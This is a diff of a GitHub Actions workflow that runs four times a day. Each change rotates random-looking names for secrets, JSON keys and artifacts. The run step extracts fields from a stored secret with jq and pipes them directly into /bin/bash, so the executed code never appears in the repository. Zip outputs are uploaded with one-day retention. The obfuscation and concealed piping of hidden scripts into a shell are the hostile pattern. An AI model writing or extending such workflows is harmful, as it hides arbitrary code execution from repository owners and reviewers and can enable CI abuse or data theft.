@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '13 0,6,12,18 * * *'
+    - cron: '4 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          t3833: ${{ secrets.t3833 }}
+          oti283: ${{ secrets.oti283 }}
         run: |
-          printf '%s' "$t3833" | jq -r .abm00 | /bin/bash
-          echo $wg917 | jq -r .umjz7637 | /bin/bash
-          printf '%s' "$nquok741" | jq -r .umlux4 | /bin/bash
-          echo $s02403 | jq -r .eszj2 | /bin/bash
-          printf '%s' "$rjan5314" | jq -r .qhhi825 | /bin/bash
+          printf '%s' "$oti283" | jq -r .k6409 | /bin/bash
+          echo $l1 | jq -r .avsc8001 | /bin/bash
+          printf '%s' "$ylb65" | jq -r .v442 | /bin/bash
+          echo $xkv51 | jq -r .hcvdq6214 | /bin/bash
+          printf '%s' "$e7118" | jq -r .rlv7989 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: 8lyB7aLX
+          name: 1WAmwghX
           path: "*.zip"
           retention-days: 1
